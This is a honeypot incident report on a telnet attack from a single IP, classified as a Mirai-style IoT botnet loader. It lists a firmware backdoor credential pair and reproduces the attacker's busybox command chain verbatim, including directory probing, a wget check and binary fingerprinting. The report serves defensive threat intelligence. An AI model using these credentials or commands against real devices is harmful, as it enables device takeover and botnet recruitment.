# Incident: 182.121.194.103

| | |
|---|---|
| Source | `182.121.194.103` |
| Country | China |
| First seen | 2026-09-03 19:57:08 UTC |
| Last seen | 2026-09-03 20:06:22 UTC |
| Sessions | 19 |
| Events | 380 |
| Services abused | telnet |
| Ports | 23 |
| Classification | IoT botnet loader |
| Apparent target | firmware backdoor account |

## Credentials attempted

19 attempts across 1 distinct pairs.

| username | password | count |
|---|---|---|
| `super` | `PhrQjGzk` | 19 |

## Commands executed

Verbatim attacker input. Lyrebird's responses are deliberately not published.

```
start
enable
config terminal
system
linuxshell
su
shell
sh
>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x41\x56\x4d\x5…
/bin/busybox wget;/bin/busybox echo -ne '\x41\x56\x4d\x50\x50\x55'
/bin/busybox cat /bin/ls\|head -n 1
/bin/busybox hexdump -e '16/1 "%c"' -n 52 /bin/ls
/bin/busybox cat /bin/ls\|more
dd bs=52 count=1 if=/bin/ls \|\| cat /bin/ls \|\| while read i; do echo $i; done &lt; /bin/ls \|\| while read i; do echo $i; done &lt; /bin/busybox
/bin/busybox dd bs=52 count=1 if=/bin/ls \|\| /bin/busybox cat /bin/ls \|\| while read i; do printf $i; done &lt; /bin/ls \|\| while read i; do printf $i; done &lt; /bin/busybox
```

## Detections

- Mirai/IoT Botnet Busybox Probe (57)
- Download-and-Execute Payload Chain (19)

---

Collected by a Lyrebird honeypot operated by [birdo.uk](https://birdo.uk). Generated 2026-09-06 06:05 UTC.

Services are emulated; no real host was compromised. Attacker input is reproduced verbatim and is hostile by definition — do not execute anything recorded here.
